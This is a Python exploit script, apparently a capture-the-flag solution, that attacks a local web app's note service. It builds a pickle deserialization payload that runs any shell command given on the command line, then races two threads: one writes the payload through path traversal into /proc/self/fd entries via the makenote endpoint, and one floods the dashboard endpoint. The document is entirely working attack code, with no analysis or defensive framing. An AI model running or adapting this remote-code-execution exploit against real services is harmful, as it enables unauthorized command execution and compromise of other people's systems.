import requests
import threading
import sys
import struct
import time
import base64
import pickle


url = "http://localhost:7000/"
COMMAND = sys.argv[1]
print(COMMAND)
def make_payload(COMMAND):
    class PickleRce(object):
        def __reduce__(self):
            import os
            return (os.system,(COMMAND,))
    expiry = struct.pack("I", int(time.time()+3600000))
    payload = expiry+pickle.dumps(PickleRce())
    return payload

payload = make_payload(COMMAND)

s = requests.Session()
s.post(url+"register",data={"username":"aa","password":"bb"})
s.post(url+"login",data={"username":"aa","password":"bb"})

def req_flag():
    for i in range(1,999999):
        r = s.get(url+"dashboard",params={'a':i})

def req_fd():
    while(True):
        for i in range(6,15):
            r = s.post(url+"makenote",data={"title":f"../../../proc/self/fd/{i}","content":base64.b64encode(payload)})

# Threading here \/
t1 = threading.Thread(target=req_flag)
t2 = threading.Thread(target=req_fd)
t1.start()
t2.start()
t1.join()
t2.join()